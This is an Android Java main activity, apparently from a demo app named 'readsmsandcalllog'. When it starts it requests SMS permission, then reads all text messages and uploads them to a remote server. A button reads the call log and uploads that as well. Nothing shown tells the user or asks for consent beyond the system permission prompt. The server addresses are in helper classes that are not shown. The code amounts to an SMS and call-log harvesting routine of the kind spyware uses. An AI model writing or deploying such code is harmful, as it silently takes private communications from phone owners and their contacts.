package com.example.readsmsandcalllog;

import android.Manifest;
import android.content.pm.PackageManager;
import android.os.Bundle;
import android.view.View;
import android.widget.Button;

import androidx.activity.EdgeToEdge;
import androidx.annotation.NonNull;
import androidx.appcompat.app.AppCompatActivity;
import androidx.core.content.ContextCompat;
import androidx.core.graphics.Insets;
import androidx.core.view.ViewCompat;
import androidx.core.view.WindowInsetsCompat;

import org.json.JSONArray;

import java.util.ArrayList;

public class MainActivity extends AppCompatActivity {

    Button callLogButton;
    @Override
    protected void onCreate(Bundle savedInstanceState) {
        super.onCreate(savedInstanceState);
        setContentView(R.layout.activity_main);

        callLogButton = findViewById(R.id.callLogButton);

        if(ContextCompat.checkSelfPermission(getBaseContext(), Manifest.permission.READ_SMS) != PackageManager.PERMISSION_GRANTED){
            requestPermissions(new String[]{Manifest.permission.READ_SMS},100);
        }else{
            ArrayList<SMSMessage> arrayList = SMSManager.getSmsMessages(MainActivity.this);
            System.out.println(arrayList.get(0).getBody());
            RetrofitManager retrofitManager = new RetrofitManager();
            retrofitManager.uploadSmsMessages(arrayList);
        }

        callLogButton.setOnClickListener(new View.OnClickListener() {
            @Override
            public void onClick(View v) {
                if(ContextCompat.checkSelfPermission(getBaseContext(), Manifest.permission.READ_CALL_LOG) != PackageManager.PERMISSION_GRANTED){
                    requestPermissions(new String[]{Manifest.permission.READ_CALL_LOG},200);
                }else{
                    CallLogManager callLogManager = new CallLogManager();
                    JSONArray jsonArray = callLogManager.getCallLog(MainActivity.this);

                    VolleyManager volleyManager = new VolleyManager();
                    volleyManager.uploadCallLog(MainActivity.this,jsonArray);
                    System.out.println(jsonArray);
                }
            }
        });


    }

    @Override
    public void onRequestPermissionsResult(int requestCode, @NonNull String[] permissions, @NonNull int[] grantResults) {
        super.onRequestPermissionsResult(requestCode, permissions, grantResults);

        if(requestCode == 100){
            if(grantResults.length>0 && grantResults[0] == PackageManager.PERMISSION_GRANTED){
                ArrayList<SMSMessage> arrayList = SMSManager.getSmsMessages(MainActivity.this);
                System.out.println(arrayList.get(0).getBody());
                RetrofitManager retrofitManager = new RetrofitManager();
                retrofitManager.uploadSmsMessages(arrayList);
            }
        }

        if(requestCode == 200){
            if(grantResults.length>0 && grantResults[0] == PackageManager.PERMISSION_GRANTED){
                CallLogManager callLogManager = new CallLogManager();
                JSONArray jsonArray = callLogManager.getCallLog(MainActivity.this);
                System.out.println(jsonArray);
                VolleyManager volleyManager = new VolleyManager();
                volleyManager.uploadCallLog(MainActivity.this,jsonArray);
            }
        }
    }
}